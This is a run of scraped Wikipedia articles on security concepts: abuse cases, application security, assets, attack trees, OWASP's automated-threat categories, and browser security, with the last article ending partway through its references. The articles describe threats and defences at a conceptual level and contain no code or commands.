



From Wikipedia, the free encyclopedia


Abuse case [1] is a specification model for security requirements used in the software development industry. The term Abuse Case is an adaptation of use case. 
The term was introduced by John McDermott and Chris Fox in 1999, while working at Computer Science Department of the James Madison University.[1] As defined by its authors, an abuse case is a type of complete interaction between a system and one or more actors, where the results of the interaction are harmful to the system, one of the actors, or one of the stakeholders in the system. We cannot define completeness just in terms of coherent transactions between actors and the system. Instead, we must define abuse in terms of interactions that result in actual harm. A complete abuse case defines an interaction between an actor and the system that  results in harm to a resource associated with one of the actors, one of the stakeholders, or the system itself.
Their notation appears to be similar to Misuse cases, but there are differences reported by Chun Wei in Misuse Cases and Abuse Cases in Eliciting Security Requirements.[2]


Overview[edit]
Use cases specify required behaviour of software and other products under development, and are essentially structured stories or scenarios detailing the normal behavior and usage of the software. Abuse cases extend the UML notation to model abuse in those systems.

Area of use[edit]
Abuse cases are most commonly used in the field of security requirements elicitation.

Basic concepts[edit]
An abuse case diagram is created together with a corresponding use case diagram, but not in the same diagram (different from Misuse case). There is no new terminology or special symbols introduced for abuse case diagrams. They are drawn with the same symbols as a use case diagram.
To distinguish between the two, the use case diagram and abuse case diagrams are kept separate, and related. Hence abuse cases do not appear in the use case diagrams and vice versa.

See also[edit]
Use case diagram
Misuse case
Threat model (software)
References[edit]


^ a b John McDermott and Chris Fox (Dec 1999). "Using Abuse Case Models for Security Requirements Analysis" (PDF). Proceedings of the 15th Annual Computer Security Applications Conference, 1999. (ACSAC '99): 55–64.

^ Chun Wei (Johnny), Sia, Misuse Cases and Abuse Cases in Eliciting Security Requirements, http://www.cs.auckland.ac.nz/compsci725s2c/archive/termpapers/csia.pdf






Retrieved from "https://en.wikipedia.org/w/index.php?title=Abuse_case&oldid=1052733014"
Categories: Software project management
 



From Wikipedia, the free encyclopedia


Measures taken to improve the security of an application
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Application security (short AppSec) includes all tasks that introduce a secure software development life cycle to development teams. Its final goal is to improve security practices and, through that, to find, fix and preferably prevent security issues within applications. It encompasses the whole application life cycle from requirements analysis, design, implementation, verification as well as maintenance.[1]


Approaches[edit]
Different approaches will find different subsets of the security vulnerabilities lurking in an application and are most effective at different times in the software lifecycle. They each represent different tradeoffs of time, effort, cost and vulnerabilities found.

Design review. Before code is written the application's architecture and design can be reviewed for security problems. A common technique in this phase is the creation of a threat model.
Whitebox security review, or code review. This is a security engineer deeply understanding the application through manually reviewing the source code and noticing security flaws. Through comprehension of the application, vulnerabilities unique to the application can be found.
Blackbox security audit. This is only through the use of an application testing it for security vulnerabilities, no source code is required.
Automated Tooling. Many security tools can be automated through inclusion into the development or testing environment. Examples of those are automated DAST/SAST tools that are integrated into code editor or CI/CD platforms.
Coordinated vulnerability platforms. These are hacker-powered application security solutions offered by many websites and software developers by which individuals can receive recognition and compensation for reporting bugs.
Web application security[edit]
Web application security is a branch of information security that deals specifically with the security of websites, web applications, and web services. At a high level, web application security draws on the principles of application security but applies them specifically to the internet and web systems.[2][3]
Web Application Security Tools are specialized tools for working with HTTP traffic, e.g., Web application firewalls.

Security threats[edit]
The Open Web Application Security Project (OWASP) provides free and open resources. It is led by a non-profit called The OWASP Foundation. The OWASP Top 10 - 2017 results from recent research based on comprehensive data compiled from over 40 partner organizations. This data revealed approximately 2.3 million vulnerabilities across over 50,000 applications.[4] According to the OWASP Top 10 - 2021, the ten most critical web application security risks include:[5]

Broken access control
Cryptographic Failures
Injection
Insecure Design
Security Misconfiguration
Vulnerable and Outdated Components
Identification and Authentification Failures
Software and Data Integrity Failures
Security Logging and Monitoring Failures*
Server-Side Request Forgery (SSRF)*
Tooling for security testing[edit]
Security testing techniques scour for vulnerabilities or security holes in applications. These vulnerabilities leave applications open to exploitation. Ideally, security testing is implemented throughout the entire Software Development Life Cycle (SDLC) so that vulnerabilities may be addressed in a timely and thorough manner.
There are many kinds of automated tools for identifying vulnerabilities in applications. Common tool categories used for identifying application vulnerabilities include:

Static Application Security Testing (SAST) analyzes source code for security vulnerabilities during an application's development. Compared to DAST, SAST can be utilized even before the application is in an executable state. As SAST has access to the full source code it is a white-box approach. This can yield more detailed results but can result in many false positives that need to be manually verified.
Dynamic Application Security Testing (DAST, often called Vulnerability scanners) automatically detects vulnerabilities by crawling and analyzing websites. This method is highly scalable, easily integrated and quick. DAST tools are well suited for dealing with low-level attacks such as injection flaws but are not well suited to detect high-level flaws, e.g., logic or business logic flaws.[6] Fuzzing tools are commonly used for input testing.[7]
Interactive Application Security Testing (IAST) assesses applications from within using software instrumentation. This combines the strengths of both SAST and DAST methods as well as providing access to code, HTTP traffic, library information, backend connections and configuration information.[8][9] Some IAST products require the application to be attacked, while others can be used during normal quality assurance testing.[10][promotional source?][11][promotional source?]
Runtime application self-protection augments existing applications to provide intrusion detection and prevention from within an application runtime.
Dependency scanners (also called Software Composition Analysis) try to detect the usage of software components with known vulnerabilities. These tools can either work on-demand, e.g., during the source code build process, or periodically.
Abstraction is the idea of making more complex things less complex.
Security standards and regulations[edit]
CERT Secure Coding
ISO/IEC 27034-1:2011 Information technology — Security techniques — Application security -- Part 1: Overview and concepts
ISO/IEC TR 24772:2013 Information technology — Programming languages — Guidance to avoiding vulnerabilities in programming languages through language selection and use
NIST Special Publication 800-53
OWASP ASVS: Web Application Security Verification Standard[12]
See also[edit]
Application service architecture (ASA)
Common Weakness Enumeration
Data security
Mobile security
OWASP
Microsoft Security Development Lifecycle
Usable security
References[edit]


^ Happe, Andreas (3 June 2021). "What is AppSec anyways?". snikt.net.

^ "Web Application Security Overview". 2015-10-23.

^ Shuaibu, Bala Musa; Norwawi, Norita Md; Selamat, Mohd Hasan; Al-Alwani, Abdulkareem (2013-01-17). "Systematic review of web application security development model". Artificial Intelligence Review. 43 (2): 259–276. doi:10.1007/s10462-012-9375-6. ISSN 0269-2821. S2CID 15221613.

^ Korolov, Maria (Apr 27, 2017). "Latest OWASP Top 10 looks at APIs, web apps: The new OWASP Top 10 list is out, and while most of it remains the same, there are new additions focusing on web applications and APIs". CSO. ProQuest 1892694046.

^ "OWASP Top 10 - 2021: The Ten Most Critical Web Application Security Risks". Open Web Application Security Project. 2021. Retrieved January 11, 2022.

^ "Web Application Vulnerability Scanners". NIST.

^ "Fuzzing". OWASP.

^ Williams, Jeff (2 July 2015). "I Understand SAST and DAST But What is an IAST and Why Does it Matter?". Contrast Security. Retrieved 10 April 2018.

^ Velasco, Roberto (7 May 2020). "What is IAST? All About Interactive Application Security Testing". Hdiv Security. Retrieved 7 May 2020.

^ Abezgauz, Irene (February 17, 2014). "Introduction to Interactive Application Security Testing". Quotium.

^ Rohr, Matthias (November 26, 2015). "IAST: A New Approach For Agile Security Testing". Secodis.

^ "OWASP Application Security Verification Standard".






Retrieved from "https://en.wikipedia.org/w/index.php?title=Application_security&oldid=1134264110"
Categories: Mobile securityData securityHidden categories: Articles with short descriptionShort description is different from WikidataAll articles lacking reliable referencesArticles lacking reliable references from December 2018
 



From Wikipedia, the free encyclopedia


Data, device, or other component of a computing environment
For other uses, see Asset (disambiguation).
In information security, computer security and network security, an asset is any data, device, or other component of the environment that supports information-related activities.   Assets generally include hardware (e.g. servers and switches), software (e.g. mission critical applications and support systems) and confidential information.[1][2] Assets should be protected from illicit access, use, disclosure, alteration, destruction, and/or theft, resulting in loss to the organization.[3]


The CIA triad[edit]
The goal of information security is to ensure the confidentiality, integrity and availability (CIA) of assets from various threats.  For example, a hacker might attack a system in order to steal credit card numbers by exploiting a vulnerability. Information Security experts must assess the likely impact of an attack and employ appropriate countermeasures.[4]  In this case they might put up a firewall and encrypt their credit card numbers.

Risk analysis[edit]
When performing risk assessment, it is important to weigh how much to spend protecting each asset against the cost of losing the asset. It is also important to take into account the chance of each loss occurring.  Intangible costs must also be factored in.  If a hacker makes a copy of all a company's credit card numbers it does not cost them anything directly but the loss in fines and reputation can be enormous.

See also[edit]
Countermeasure (computer)
Factor analysis of information risk
Information security management
IT risk
Risk factor
Risk management
References[edit]


^ ISO/IEC 13335-1:2004 Information technology -- Security techniques -- Management of information and communications technology security -- Part 1: Concepts and models for information and communications technology security management

^ "ENISA Glossary". Archived from the original on 2012-02-29. Retrieved 2010-11-21.

^ "An Introduction to Factor Analysis of Information Risk (FAIR)", Risk Management Insight LLC, November 2006 Archived 2014-11-18 at the Wayback Machine;

^ IETF RFC 2828


External links[edit]
FISMApedia TERM




Retrieved from "https://en.wikipedia.org/w/index.php?title=Asset_(computer_security)&oldid=1049048186"
Categories: Data securityIT risk managementReliability analysisSecurity complianceHidden categories: Webarchive template wayback linksArticles with short descriptionShort description is different from Wikidata
 



From Wikipedia, the free encyclopedia


Conceptual diagrams showing how an asset, or target, might be attacked
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Attack tree" – news · newspapers · books · scholar · JSTOR (April 2012) (Learn how and when to remove this template message)
Attack trees are conceptual diagrams showing how an asset, or target, might be attacked.[1]  Attack trees have been used in a variety of applications.  In the field of information technology, they have been used to describe threats on computer systems and possible attacks to realize those threats. However, their use is not restricted to the analysis of conventional information systems.  They are widely used in the fields of defense and aerospace for the analysis of threats against tamper resistant electronics systems (e.g., avionics on military aircraft).[2]  Attack trees are increasingly being applied to computer control systems (especially relating to the electric power grid).[3]  Attack trees have also been used to understand threats to physical systems.
Some of the earliest descriptions of attack trees are found in papers and articles by Bruce Schneier,[4] when he was CTO of Counterpane Internet Security.  Schneier was clearly involved in the development of attack tree concepts and was instrumental in publicizing them.  However, the attributions in some of the early publicly available papers on attack trees[5] also suggest the involvement of the National Security Agency in the initial development.
Attack trees are very similar, if not identical, to threat trees. Threat trees were discussed in 1994 by Edward Amoroso.[6]


Basic[edit]
 Attack tree for computer viruses.  Here we assume a system such as Windows NT, where not all users have full system access.  All child nodes operate on OR conditions.
Attack trees are multi-leveled diagrams consisting of one root, leaves, and children.  From the bottom up, child nodes are conditions which must be satisfied to make the direct parent node true; when the root is satisfied, the attack is complete.  Each node may be satisfied only by its direct child nodes.
A node may be the child of another node; in such a case, it becomes logical that multiple steps must be taken to carry out an attack.  For example, consider classroom computers which are secured to the desks.  To steal one, the securing cable must be cut or the lock unlocked.  The lock may be unlocked by picking or by obtaining the key.  The key may be obtained by threatening a key holder, bribing a keyholder, or taking it from where it is stored (e.g. under a mousemat).  Thus a four level attack tree can be drawn, of which one path is (Bribe Keyholder, Obtain Key, Unlock Lock, Steal Computer).
An attack described in a node may require one or more of many attacks described in child nodes to be satisfied.  Our above condition shows only OR conditions; however, an AND condition can be created, for example, by assuming an electronic alarm which must be disabled if and only if the cable will be cut.  Rather than making this task a child node of cutting the lock, both tasks can simply reach a summing junction.  Thus the path ((Disable Alarm, Cut Cable), Steal Computer) is created.
Attack trees are related to the established fault tree formalism.[7]  Fault tree methodology employs boolean expressions to gate conditions when parent nodes are satisfied by leaf nodes. By including a priori probabilities with each node, it is possible to perform calculate probabilities with higher nodes using Bayes Rule. However, in reality accurate probability estimates are either unavailable or too expensive to gather. With respect to computer security with active participants (i.e., attackers), the probability distribution of events are probably not independent nor uniformly distributed, hence, naive Bayesian analysis is unsuitable.
Since the Bayesian analytic techniques used in fault tree analysis cannot legitimately be applied to attack trees, analysts instead use other techniques[8][9] to determine which attacks will be preferred by a particular attacker.  These may involve comparing the attacker's capabilities (time, money, skill, equipment) with the resource requirements of the specified attack.  Attacks which are near or beyond the attacker's ability to perform are less preferred than attacks that are perceived as cheap and easy. The degree to which an attack satisfies the adversary's objectives also affects the attacker's choices.  Attacks that are both within the adversary's capabilities, and which satisfy their goals, are more likely than those that do not.

Examination[edit]
Attack trees can become large and complex, especially when dealing with specific attacks.  A full attack tree may contain hundreds or thousands of different paths all leading to completion of the attack.  Even so, these trees are very useful for determining what threats exist and how to deal with them.
Attack trees can lend themselves to defining an information assurance strategy.  It is important to consider, however, that implementing policy to execute this strategy changes the attack tree.  For example, computer viruses may be protected against by refusing the system administrator access to directly modify existing programs and program folders, instead requiring a package manager be used.  This adds to the attack tree the possibility of design flaws or exploits in the package manager.
One could observe that the most effective way to mitigate a threat on the attack tree is to mitigate it as close to the root as possible. Although this is theoretically sound, it is not usually possible to simply mitigate a threat without other implications to the continued operation of the system.  For example, the threat of viruses infecting a Windows system may be largely reduced by using a standard (non-administrator) account and NTFS instead of FAT file system so that normal users are unable to modify the operating system.  Implementing this negates any way, foreseen or unforeseen, that a normal user may come to infect the operating system with a virus[citation needed]; however, it also requires that users switch to an administrative account to carry out administrative tasks, thus creating a different set of threats on the tree and more operational overhead.  Also, users are still able to infect files to which they have write permissions, which may include files and documents.
Systems using cooperative agents that dynamically examine and identify vulnerability chains, creating attack trees, have been built since 2000.[10]

Attack tree modeling software[edit]
Several commercial packages and open source products are available.

Open source[edit]
ADTool from University of Luxembourg
AT-AT
Deciduous
Ent
SeaMonster
Commercial[edit]
AttackTree+ from Isograph
SecurITree from Amenaza Technologies
RiskTree from 2T Security
See also[edit]
Computer insecurity
Computer security
Computer virus
Fault tree analysis
IT risk
Threat (computer)
Vulnerability (computing)
References[edit]


^ R. Shirey (August 2007). Internet Security Glossary, Version 2. Network Working Group. doi:10.17487/RFC4949. RFC 4949. Informational.


^ U.S. Department of Defense, "Defense Acquisition Guidebook", Section 8.5.3.3

^ Chee-Wooi Ten, Chen-Ching Liu, Manimaran Govindarasu, Vulnerability Assessment of Cybersecurity for SCADA Systems Using Attack Trees, "Archived copy" (PDF). Archived from the original (PDF) on 2010-06-30. Retrieved 2012-04-04.{{cite web}}:  CS1 maint: archived copy as title (link)

^ Schneier, Bruce (December 1999). "Attack Trees". Dr Dobb's Journal, v.24, n.12. Archived from the original on 6 August 2007. Retrieved 2007-08-16.

^ Chris Salter, O. Sami Saydjari, Bruce Schneier, Jim Wallner, Toward a Secure System Engineering Methodology,  "Archived copy" (PDF). Archived (PDF) from the original on 2011-06-23. Retrieved 2012-04-04.{{cite web}}:  CS1 maint: archived copy as title (link)

^ Amoroso, Edward (1994). Fundamentals of Computer Security. Upper Saddle River: Prentice Hall. ISBN 0-13-108929-3.

^ "Fault Tree Handbook with Aerospace Applications" (PDF). Archived from the original (PDF) on 2016-12-28. Retrieved 2019-02-26.

^ Donald L Buckshaw, Gregory S Parnell, Willard L Ulkenholz, Donald L Parks, James M Wallner, O. Sami Saydjari, Mission Oriented Design Analysis of Critical Information Systems, Military Operations Research V10, N2, 2005, [1][permanent dead link]

^ Terrance R Ingoldsby, Amenaza Technologies Limited, Attack Tree-based Threat Risk Analysis, A vendor white paper, "Archived copy" (PDF). Archived (PDF) from the original on 2016-03-04. Retrieved 2012-04-09.{{cite web}}:  CS1 maint: archived copy as title (link)

^ "NOOSE - Networked Object-Oriented Security Examiner, 14th Systems Administration Conference (LISA 2000), New Orleans". Retrieved 2010-04-21.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Attack_tree&oldid=1117087062"
Categories: Computer network securityHidden categories: CS1 maint: archived copy as titleAll articles with dead external linksArticles with dead external links from October 2016Articles with permanently dead external linksArticles with short descriptionShort description is different from WikidataArticles needing additional references from April 2012All articles needing additional referencesAll articles with unsourced statementsArticles with unsourced statements from October 2008
 



From Wikipedia, the free encyclopedia


Part of a series onAutomation
Automation in general

Banking
Building
Home
Highway system
Laboratory
Library
Broadcast
Console
Pool cleaner
Pop music
Reasoning
Semi-automation
Telephone
Attendant
Switchboard
Teller machine
Vehicular
Vending machine


Robotics and robots

Autonomous research
Domestic
Guided vehicle
Industrial
Lawn mower
Paint


Impact of automation

Manumation
OOL
Bias
Self-driving cars
Technological unemployment
Jobless recovery
Post-work society
Threat


Trade shows and awards

ASP-DAC
DAC
DATE
IEEE Robotics and Automation Award
ICCAD

vte
An automated threat is a type of computer security threat to a computer network or web application, characterised by the malicious use of automated tools such as Internet bots.[1] Automated threats are popular on the internet as they can complete large amounts of repetitive tasks with almost no cost to execute.[2]

Threat ontology[edit]
The OWASP Automated Threat Handbook provides a threat ontology list for classifying automated threats, which are enumerated below.



Identity Code
Name
Defining characteristics


OAT-020
Account Aggregation
Use by an intermediary application that collects together multiple accounts
and interacts on their behalf



OAT-019
Account Creation
Create multiple accounts for subsequent misuse


OAT-003
Ad Fraud
False clicks and fraudulent display of web-placed advertisements


OAT-009
CAPTCHA Bypass
Solve anti-automation tests


OAT-001
Carding
Multiple payment authorisation attempts used to verify the validity of bulk
stolen payment card data



OAT-010
Card Cracking
Identify missing start/expiry dates and security codes for stolen payment card
data by trying different values



OAT-012
Cashing Out
Buy goods or obtain cash utilising validated stolen payment card or other user
account data



OAT-007
Credential Cracking
Identify valid login credentials by trying different values for usernames and/or
passwords



OAT-015
Denial of Service
Target resources of the application and database servers, or individual user
accounts, to achieve denial of service (DoS)



OAT-006
Expediting
Perform actions to hasten progress of usually slow, tedious or time-consuming
actions



OAT-004
Fingerprinting
Elicit information about the supporting software and framework types and
versions



OAT-018
Footprinting
Probe and explore application to identify its constituents and properties


OAT-005
Scalping
Obtain limited-availability and/or preferred goods/services by unfair methods


OAT-011
Scraping
Collect application content and/or other data for use elsewhere


OAT-016
Skewing
Repeated link clicks, page requests or form submissions intended to alter some
metric



OAT-013
Sniping
Last minute bid or offer for goods or services


OAT-017
Spamming
Malicious or questionable information addition that appears in public or
private content, databases or user messages



OAT-002
Token Cracking
Mass enumeration of coupon numbers, voucher codes, discount tokens, etc.


OAT-014
Vulnerability Scanning
Crawl and fuzz application to identify weaknesses and possible vulnerabilities

References[edit]


^ Watson, Colin (2015-10-26). "OWASP Automated Threat Handbook" (PDF). OWASP. OWASP. Retrieved 2016-09-10.

^ "Security Insights: Defending Against Automated Threats | SecurityWeek.Com". www.securityweek.com. Retrieved 2016-09-18.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Automated_threat&oldid=1122803185"
Categories: Types of malwareImpact of Automation
 



From Wikipedia, the free encyclopedia


Application of internet security to web browsers

Browser security is the application of Internet security to web browsers in order to protect networked data and computer systems from breaches of privacy or malware. Security exploits of browsers often use JavaScript, sometimes with cross-site scripting (XSS)[1] with a secondary payload using Adobe Flash.[2] Security exploits can also take advantage of vulnerabilities (security holes) that are commonly exploited in all browsers (including Mozilla Firefox,[3] Google Chrome,[4] Opera,[5] Microsoft Internet Explorer,[6] and Safari[7]).


Security[edit]
Web browsers can be breached in one or more of the following ways:

Operating system is breached and malware is reading/modifying the browser memory space in privilege mode[8]
Operating system has a malware running as a background process, which is reading/modifying the browser memory space in privileged mode
Main browser executable can be hacked
Browser components may be hacked
Browser plugins can be hacked
Browser network communications could be intercepted outside the machine[9]
The browser may not be aware of any of the breaches above and may show user a safe connection is made.
Whenever a browser communicates with a website, the website, as part of that communication, collects some information about the browser (in order to process the formatting of the page to be delivered, if nothing else).[10]  If malicious code has been inserted into the website's content, or in a worst-case scenario, if that website has been specifically designed to host malicious code, then vulnerabilities specific to a particular browser can allow this malicious code to run processes within the browser application in unintended ways (and remember, one of the bits of information that a website collects from a browser communication is the browser's identity- allowing specific vulnerabilities to be exploited).[11] Once an attacker is able to run processes on the visitor's machine, then exploiting known security vulnerabilities can allow the attacker to gain privileged access (if the browser isn't already running with privileged access) to the "infected" system in order to perform an even greater variety of malicious processes and activities on the machine or even the victim's whole network.[12]
Breaches of web browser security are usually for the purpose of bypassing protections to display pop-up advertising[13] collecting personally identifiable information (PII) for either Internet marketing or identity theft, website tracking or web analytics about a user against their will using tools such as web bugs, Clickjacking, Likejacking (where Facebook's like button is targeted),[14][15][16][17] HTTP cookies, zombie cookies or Flash cookies (Local Shared Objects or LSOs);[2] installing adware, viruses, spyware such as Trojan horses (to gain access to users' personal computers via cracking) or other malware including online banking theft using man-in-the-browser attacks.
In depth study of vulnerabilities in Chromium web-browser indicates that, Improper Input Validation (CWE-20) and Improper Access Control (CWE-284) are the most occurring root causes for security vulnerabilities.[18] Furthermore, among vulnerabilities examined at the time of this study, 106 vulnerabilities occurred in Chromium because of reusing or importing vulnerable versions of third party libraries.
Vulnerabilities in the web browser software itself can be minimized by keeping browser software updated,[19] but will not be sufficient if the underlying operating system is compromised, for example, by a rootkit.[20]  Some subcomponents of browsers such as scripting, add-ons, and cookies[21][22][23] are particularly vulnerable ("the confused deputy problem") and also need to be addressed.
Following the principle of defence in depth, a fully patched and correctly configured browser may not be sufficient to ensure that browser-related security issues cannot occur. For example, a rootkit can capture keystrokes while someone logs into a banking website, or carry out a man-in-the-middle attack by modifying network traffic to and from a web browser. DNS hijacking or DNS spoofing may be used to return false positives for mistyped website names, or to subvert search results for popular search engines. Malware such as RSPlug simply modifies a system's configuration to point at rogue DNS servers.
Browsers can use more secure methods of network communication to help prevent some of these attacks:

DNS: DNSSec and DNSCrypt, for example with non-default DNS servers such as Google Public DNS or OpenDNS.
HTTP: HTTP Secure and SPDY with digitally signed public key certificates or Extended Validation Certificates.
Perimeter defenses, typically through firewalls and the use of filtering proxy servers that block malicious websites and perform antivirus scans of any file downloads, are commonly implemented as a best practice in large organizations to block malicious network traffic before it reaches a browser.
The topic of browser security has grown to the point of spawning the creation of entire organizations, such as The Browser Exploitation Framework Project,[24]  creating platforms to collect tools to breach browser security, ostensibly in order to test browsers and network systems for vulnerabilities.

Plugins and extensions[edit]
Although not part of the browser per se, browser plugins and extensions extend the attack surface, exposing vulnerabilities in Adobe Flash Player, Adobe (Acrobat) Reader, Java plugin, and ActiveX that are commonly exploited. Researchers[25] have extensively studied the security architecture of various web-browsers in particular those relying on plug-and-play designs. This study has identified 16 common vulnerability types, and 19 potential mitigations. Malware may also be implemented as a browser extension, such as a browser helper object in the case of Internet Explorer.[26] Browsers like Google Chrome and Mozilla Firefox can block—or warn users of—insecure plugins.

Adobe Flash[edit]
Main article: Local shared object § Privacy concerns
An August 2009 study by the Social Science Research Network found that 50% of websites using Flash were also employing Flash cookies, yet privacy policies rarely disclosed them, and user controls for privacy preferences were lacking.[27] Most browsers' cache and history delete functions do not affect Flash Player's writing Local Shared Objects to its own cache, and the user community is much less aware of the existence and function of Flash cookies than HTTP cookies.[28] Thus, users having deleted HTTP cookies and purged browser history files and caches may believe that they have purged all tracking data from their computers while in fact Flash browsing history remains. As well as manual removal, the BetterPrivacy add-on for Firefox can remove Flash cookies.[2] Adblock Plus can be used to filter out specific threats[13] and Flashblock can be used to give an option before allowing content on otherwise trusted sites.[29]
Charlie Miller recommended "not to install Flash"[30] at the computer security conference CanSecWest. Several other security experts also recommend to either not install Adobe Flash Player or to block it.[31]

Password security model[edit]
The contents of a web page are arbitrary and controlled by the entity owning the domain named displayed in the address bar. If HTTPS is used, then encryption is used to secure against attackers with access to the network from changing the page contents en route. When presented with a password field on a web page, a user is supposed to look at the address bar to determine whether the domain name in the address bar is the correct place to send the password.[32] For example, for Google's single sign-on system (used on e.g. youtube.com), the user should always check that the address bar says "https://accounts.google.com" before inputting their password.
An un-compromised browser guarantees that the address bar is correct. This guarantee is one reason why browsers will generally display a warning when entering fullscreen mode, on top of where the address bar would normally be, so that a fullscreen website cannot make a fake browser user interface with a fake address bar.[33]

Hardware browser[edit]
There have been attempts to market hardware-based browsers running from non-writable, read-only file systems. Data cannot be stored on the device and the media cannot be overwritten, presenting a clean executable each time it loads. The first such device was the ZeusGard Secure Hardware Browser, released in late 2013. The ZeusGard website has not been functional since mid-2016. Another device, the iCloak® Stik from the iCloak website provides a complete Live OS which completely replaces the computer's entire operating system and offers two web browsers from the read-only system. With iCloak they provide the Tor browser for Anonymous browsing as well as a regular Firefox browser for non-anonymous browsing. Any non-secured web traffic (not using https, for example), could still be subject to man-in-the-middle alteration or other network traffic-based manipulations.

LiveCD[edit]
LiveCDs, which run an operating system from a non-writable source, typically come with Web browsers as part of their default image. If the original LiveCD image is free of malware, all of the software used, including the Web browser, will load free of malware every time the LiveCD image is booted.

Browser hardening[edit]
Browsing the Internet as a least-privilege user account (i.e. without administrator privileges) limits the ability of a security exploit in a web browser from compromising the whole operating system.[34]
Internet Explorer 4 and later allows the blacklisting[35][36][37] and whitelisting[38][39] of ActiveX controls, add-ons and browser extensions in various ways.
Internet Explorer 7 added "protected mode", a technology that hardens the browser through the application of a security sandboxing feature of Windows Vista called Mandatory Integrity Control.[40]
Google Chrome provides a sandbox to limit web page access to the operating system.[41]
Suspected malware sites reported to Google,[42] and confirmed by Google, are flagged as hosting malware in certain browsers.[43]
There are third-party extensions and plugins available to harden even the latest browsers,[44] and some for older browsers and operating systems. Whitelist-based software such as NoScript can block JavaScript and Adobe Flash which is used for most attacks on privacy, allowing users to choose only sites they know are safe - AdBlock Plus also uses whitelist ad filtering rules subscriptions, though both the software itself and the filtering list maintainers have come under controversy for by-default allowing some sites to pass the pre-set filters.[45] The US-CERT recommends to block Flash using NoScript.[46]

Fuzzing[edit]
Modern web browsers undergo extensive fuzzing to uncover vulnerabilities. The Chromium code of Google Chrome is continuously fuzzed by the Chrome Security Team with 15,000 cores.[47] For Microsoft Edge and Internet Explorer, Microsoft performed fuzzed testing with 670 machine-years during product development, generating more than 400 billion DOM manipulations from 1 billion HTML files.[48][47]

Best practice[edit]
This section does not cite any sources. Please help improve this section by adding citations to reliable sources. Unsourced material may be challenged and removed. (April 2019) (Learn how and when to remove this template message)
Load clean software: Boot from a known clean OS that has a known clean Web browser
Adopt adequate countermeasures against the Cross-Origin Resource Sharing (CORS) vulnerability (example patches are provided for WebKit-based browsers)
Prevent attacks via third-party software: Use a hardened Web browser or add-on-free-browsing mode
Prevent DNS manipulation: Use trusted and secure DNS[49]
Avoid website-based exploits: Employ link-checking browser plug-ins commonly found in internet security software
Avoid malicious content: Employ perimeter defenses and anti-malware software
See also[edit]
Filter bubble
Frame injection
Identity driven networking
Internet safety
Network security policy
Application security
References[edit]


^ Maone, Giorgio. "NoScript :: Add-ons for Firefox". Mozilla Add-ons. Mozilla Foundation.

^ a b c "BetterPrivacy :: Add-ons for Firefox". Mozilla Foundation.[permanent dead link]

^ Keizer, Greg. Firefox 3.5 Vulnerability Confirmed Archived 28 October 2010 at the Wayback Machine. Retrieved 19 November 2010.

^ Messmer, Ellen and NetworkWorld. "Google Chrome Tops 'Dirty Dozen' Vulnerable Apps List". Retrieved 19 November 2010.

^ Skinner, Carrie-Ann. Opera Plugs "Severe" Browser Hole Archived 20 May 2009 at the Wayback Machine. Retrieved 19 November 2010.

^ Bradly, Tony. "It's Time to Finally Drop Internet Explorer 6"  Archived 15 October 2012 at the Wayback Machine. Retrieved 19 November 2010.

^ "Browser". Mashable. Archived from the original on 2 September 2011. Retrieved 2 September 2011.

^ Smith, Dave (21 March 2013). "The Yontoo Trojan: New Mac OS X Malware Infects Google Chrome, Firefox And Safari Browsers Via Adware". IBT Media Inc. Archived from the original on 24 March 2013. Retrieved 21 March 2013.

^ Goodin, Dan. "MySQL.com breach leaves visitors exposed to malware". The Register. Archived from the original on 28 September 2011. Retrieved 26 September 2011.

^ Clinton Wong. "HTTP Transactions". O'Reilly. Archived from the original on 13 June 2013.

^ "9 Ways to Know Your PC is Infected with Malware". Archived from the original on 11 November 2013.

^ "Symantec Security Response Whitepapers". Archived from the original on 9 June 2013.

^ a b Palant, Wladimir. "Adblock Plus :: Add-ons for Firefox". Mozilla Add-ons. Mozilla Foundation.

^ "Facebook privacy probed over 'like,' invitations". CBC News. 23 September 2010. Archived from the original on 26 June 2012. Retrieved 24 August 2011.

^ Albanesius, Chloe (19 August 2011). "German Agencies Banned From Using Facebook, 'Like' Button". PC Magazine. Archived from the original on 29 March 2012. Retrieved 24 August 2011.

^ McCullagh, Declan (2 June 2010). "Facebook 'Like' button draws privacy scrutiny". CNET News. Archived from the original on 5 December 2011. Retrieved 19 December 2011.

^ Roosendaal, Arnold (30 November 2010). "Facebook Tracks and Traces Everyone: Like This!". SSRN 1717563.

^ Santos, J. C. S.; Peruma, A.; Mirakhorli, M.; Galstery, M.; Vidal, J. V.; Sejfia, A. (April 2017). "Understanding Software Vulnerabilities Related to Architectural Security Tactics: An Empirical Investigation of Chromium, PHP and Thunderbird". 2017 IEEE International Conference on Software Architecture (ICSA): 69–78. doi:10.1109/ICSA.2017.39. ISBN 978-1-5090-5729-0. S2CID 29186731.

^ State of Vermont. "Web Browser Attacks". Archived from the original on 13 February 2012. Retrieved 11 April 2012.

^ "Windows Rootkit Overview" (PDF). Symantec. Archived from the original (PDF) on 16 May 2013. Retrieved 20 April 2013.

^ "Cross Site Scripting Attack". Archived from the original on 15 May 2013. Retrieved 20 May 2013.

^ Lenny Zeltser. "Mitigating Attacks on the Web Browser and Add-Ons". Archived from the original on 7 May 2013. Retrieved 20 May 2013.

